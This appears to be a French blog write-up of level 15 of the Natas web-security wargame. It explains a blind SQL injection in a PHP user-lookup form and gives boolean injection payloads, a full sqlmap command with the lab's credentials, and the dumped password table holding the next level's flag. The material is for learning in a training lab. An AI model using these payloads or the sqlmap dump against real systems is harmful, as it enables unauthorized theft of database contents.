---
layout: post
title: Wargame Natas - Writeup Level 15
description: La solution du level 15 du wargame Natas qui s'avère être une faille de type blind SQL injection.
categories: hacking
tags: [natas, wargame, blind sqlinjection]
photo: overthewire_logo.png
comments: true
---

Il y a quelque temps je me suis penché sur le wargame [Natas](http://www.overthewire.org/wargames/natas) présent sur le site  [overthewire.org](http://www.overthewire.org), qui permet de s'initier à la sécurité web. Les épreuves sont pour la plupart assez simples et ne devrait pas poser de problèmes à ceux qui ont l'habitude des épreuves de ce genre là. Pour ceux que ça intéresse j'ai mis à disposition les solutions des épreuves précédentes sur le [wiki](http://wiki.zenk-security.com/doku.php?id=natas_wargame) de ZenkSecurity.

J'ai choisi de rédiger le writeup du level 15 pour montrer que la bonne maîtrise d'un outil peut faire gagner pas mal de temps, en l’occurrence nous allons utiliser sqlmap qui est un des outils les plus populaires pour exploiter les failles de type SQL injection.

L'épreuve se présent sous la forme d'un simple formulaire permettant de vérifier l'existence d'un utilisateur dans la base de données :

![Natas1](/img/blog_img/natas15_1.png)

Lorsque que l'on valide le formulaire un message nous indique si oui ou non l'utilisateur est présent :

![Natas1](/img/blog_img/natas15_2.png)

On suppose qu'il va falloir récupérer les informations de l'utilisateur "natas16" puisqu'il existe.

Jetons un oeil au code source :

{% highlight php linenos %}
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
{% endhighlight %}

On apprend tout d'abord que les informations sont stockées dans une table nommée "users" et qui comprend deux colonnes, "username" et "password". Le flag pour le prochain niveau correspond très probablement au mot de passe de l'utilisateur natas16.

On remarque qu'il est possible de modifier la requête SQL en manipulant le paramètre "username" puisque ce dernier n'est pas filtré. Malheureusement on ne va pas pouvoir directement récupérer les informations présente en base puisque la seule informations que nous est fournis est si oui ou non l'utilisateur existe.

Pour arriver à nos fin nous allons utiliser une technique appelé Blind SQL injection, un exemple est plus parlant :

    natas16" and 1=2# // This user doesn't exist.
    natas16" and 1=1# //  This user exist.
    natas16" and substr(password,1,1)='4'# // This user doesn't exist.
    natas16" and substr(password,1,1)='3'# //  This user exist.

On peut donc récupérer caractère par caractère le mot de passe de l'utilisateur natas16 avec un petit script, mais comme je suis feignant on va utiliser sqlmap avec les options qui vont bien:

    sqlmap.py
    -u "http://natas15.natas.labs.overthewire.org/"
    --string="This user exists"
    --technique=B
    --auth-type=Basic
    --auth-cred=natas15:m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV
    --data "username=natas16"
    -D natas15
    -T users
    -C username,password
    --dump
    --level=5
    --risk=3

Après quelques minutes vous devriez obtenir ceci :

    +----------------------------------+----------+
    | password                         | username |
    +----------------------------------+----------+
    | hROtsfM734                       | alice    |
    | 6P151OntQe                       | bob      |
    | HLwuGKts2w                       | charlie  |
    | 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L | natas16  |
    +----------------------------------+----------+

Et une épreuve validée de plus :)

Pour plus d'info concernant les options de sqlmap reportez vous à la [documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Et si vous voulez voir l'exécution du script en direct c'est par ici :

<script type="text/javascript" src="http://ascii.io/a/1623.js" id="asciicast-1623"> </script>